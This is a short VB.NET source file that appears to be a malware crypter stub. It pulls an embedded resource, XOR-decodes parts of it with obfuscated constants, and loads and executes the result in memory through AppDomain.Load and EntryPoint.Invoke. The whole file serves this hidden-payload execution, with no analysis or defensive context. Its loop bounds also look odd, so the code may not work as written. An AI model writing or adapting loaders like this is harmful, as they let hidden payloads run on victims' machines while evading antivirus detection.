Imports System
Imports System.Windows.Forms

'AssemblyInfo

Module Main_Module

    Public PX_Func_001_param_01 As Byte() = New System.Resources.ResourceManager("DllResourceReplace", System.Reflection.Assembly.GetEntryAssembly).GetObject("DllResourceReplace") '= My.Resources.DllResourceReplace

    Sub Main()

        For x As Integer = Integer.Parse("0") To Integer.Parse("876567875") - 1 Step Integer.Parse("12983")
            PX_Func_001_param_01(x) = PX_Func_001_param_01(x) Xor Integer.Parse("12983")
        Next

        AppDomain.CurrentDomain.Load(PX_Func_001_param_01).EntryPoint.Invoke(Nothing, Nothing)

    End Sub

End Module